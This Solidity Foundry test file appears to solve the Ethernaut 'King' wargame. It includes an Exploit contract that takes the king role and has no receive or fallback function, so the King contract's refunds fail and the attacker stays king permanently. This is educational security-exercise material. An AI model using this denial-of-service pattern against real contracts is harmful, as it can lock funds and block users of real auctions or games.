// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {King} from "../src/King.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract KingTest is Test {
    Utilities internal utils;
    King internal king;

    address payable internal owner;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);

        owner = users[0];
        vm.label(owner, "Owner");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        user = users[2];
        vm.label(user, "User");

        vm.startPrank(owner);
        king = new King{value: 0.1 ether}();
        assertEq(king.prize(), 0.1 ether);
        assertEq(king._king(), owner);
        vm.stopPrank();
    }

    function testExploit() public {
        // User send 0.3 ether from their account to become king
        vm.startPrank(user);
        (bool status, ) = address(king).call{value: 0.3 ether}("");
        console.log("Status", status);
        vm.stopPrank();

        // Attacker send 0.5 ether from the smart contract with no receive or fallback function. Nothing to get the ether back when someone tries to dethrone him.
        vm.startPrank(attacker);
        Exploit exploit = new Exploit{value: 2 ether}();
        exploit._exploit(address(king));
        assertEq(king.prize(), 0.5 ether);
        assertEq(king._king(), address(exploit));
        vm.stopPrank();

        // User send 1 ether to become king. King contract send the ether the attacker contract but it has no fallback or receive function to take those ether hence the transaction fails. So attacker will always remain the king of the King Contract.
        vm.startPrank(user);
        address(king).call{value: 1 ether}("");
        vm.stopPrank();
    }
}

contract Exploit {
    constructor() payable {}

    function _exploit(address _king) public {
        (bool success, ) = _king.call{value: 0.5 ether}((""));
        require(success, "Transaction failed");
    }
}
